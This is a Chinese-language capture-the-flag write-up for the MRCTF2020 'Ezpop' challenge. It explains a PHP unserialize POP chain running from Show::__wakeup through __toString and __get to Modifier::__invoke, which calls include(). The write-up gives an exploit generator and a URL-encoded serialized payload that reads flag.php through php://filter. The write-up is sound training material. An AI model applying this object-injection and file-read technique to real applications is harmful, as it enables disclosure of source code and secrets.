# \[MRCTF2020]Ezpop

## \[MRCTF2020]Ezpop

## 考点

* pop链构造
* 文件包含配合伪协议读取文件

## wp

```php
//flag.php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

魔术方法调用情况如下图

![](../../.gitbook/assets/serial\_2.png)

反序列化一般从`__destruct()`和`__wakeup()`入手，也可以从漏洞点倒推

本题在`Modifier::append()`处，可以配合伪协议读取flag.php，从该函数倒推，需要执行`Modifier::__invoke()`，继续倒推，在`Test::__get()`处可以把`Modifier`作为函数调用，在`Show::__toString()`处可以访问`Test`不存在的属性从而触发`Test::__get()`，最后问题就变成如何触发`Show::__toString()`

在`Show::__wakeup()`中有个preg\_match匹配，它会把`$this->source`作为字符串处理，这就可以触发`Show::__toString()`

```php
<?php
class Modifier {
    protected  $var;
    public function __construct($var){
        $this->var = $var;
    }
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}
$x = new Modifier('php://filter/convert.base64-encode/resource=flag.php');
$a = new Test();
$a->p = $x;
$c = new Show();
$c->str = $a;
$b = new Show();
$b->source = $c;
echo urlencode(serialize($b));
```

payload

```
O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```
